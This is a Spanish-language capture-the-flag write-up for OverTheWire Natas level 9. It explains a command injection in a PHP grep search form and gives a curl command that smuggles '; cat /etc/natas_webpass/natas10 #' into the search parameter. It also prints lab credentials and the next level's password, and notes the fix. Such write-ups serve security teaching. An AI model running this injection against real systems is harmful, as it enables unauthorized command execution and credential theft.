# Natas Level09

## Descripción
> **Level Goal (natas9.natas.labs.overthewire.org):** Un formulario de búsqueda ("Find words containing") ejecuta internamente `grep -i $key dictionary.txt` con el valor recibido, sin sanear ni escapar.

## Solución
Es una inyección de comandos clásica: como `$key` se concatena directo en una llamada a `passthru("grep -i $key dictionary.txt")`, se puede cerrar el comando de `grep` con `;` (o encadenar con otros separadores de shell) y ejecutar comandos arbitrarios.

```bash
curl -s -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 -G \
  --data-urlencode "needle=nomatch; cat /etc/natas_webpass/natas10 #" \
  http://natas9.natas.labs.overthewire.org/index.php
# EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv
```

## Notas adicionales
- El `#` al final comenta cualquier resto de la línea original de `grep` (el `dictionary.txt` que el propio PHP añade después de nuestra entrada).
- Cualquier concatenación directa de entrada de usuario en una llamada a `exec`/`passthru`/`system`/`shell_exec` es una inyección de comandos. La forma correcta es usar APIs que separen argumentos (p. ej. `escapeshellarg`) o, mejor, evitar invocar un shell externo.

## Referencias
- Reto original: http://natas9.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Command_Injection (OWASP, Command Injection)
